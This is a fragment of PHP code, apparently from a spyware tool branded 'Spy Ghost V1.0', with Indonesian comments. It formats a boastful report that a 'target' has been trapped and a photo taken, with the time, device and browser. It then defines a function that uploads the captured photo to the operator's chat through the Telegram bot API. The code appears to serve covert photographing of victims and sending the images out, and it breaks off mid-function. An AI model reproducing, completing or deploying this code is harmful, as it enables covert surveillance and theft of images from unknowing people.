// --- TAMPILAN LAPORAN MEWAH ---
    $time = date('H:i:s d-m-Y');
    $brand = "Spy Ghost V1.0";
    
    $caption = "<b>─── 『 👻 $brand 』 ───</b>\n\n";
    $caption .= "<b>🎯 TARGET TERJERAT!</b>\n";
    $caption .= "<b>━━━━━━━━━━━━━━━━━━━━</b>\n";
    $caption .= "<b>📅 Waktu :</b> <code>$time</code>\n";
    $caption .= "<b>📱 Device :</b> <code>Android 10</code>\n";
    $caption .= "<b>🌐 Browser:</b> <code>Chrome Mobile</code>\n";
    $caption .= "<b>━━━━━━━━━━━━━━━━━━━━</b>\n\n";
    $caption .= "<b>🕵️ Status :</b> <i>Foto Berhasil Diambil!</i>\n";
    $caption .= "<b>🔥 BY BOSS KENSORA 🔥</b>";

    function kirimFoto($cid, $tk, $fl, $cp) {
        $url = "https://api.telegram.org/bot$tk/sendPhoto";
        $data = [
            'chat_id' => $cid,
            'photo' => new CURLFile(realpath($fl)),
            'caption' => $cp,
            'parse_mode' => 'HTML' // Ganti ke HTML biar bisa pake <b> dan <code>
        ];
        // ... sisa kode curl tetap sama ...
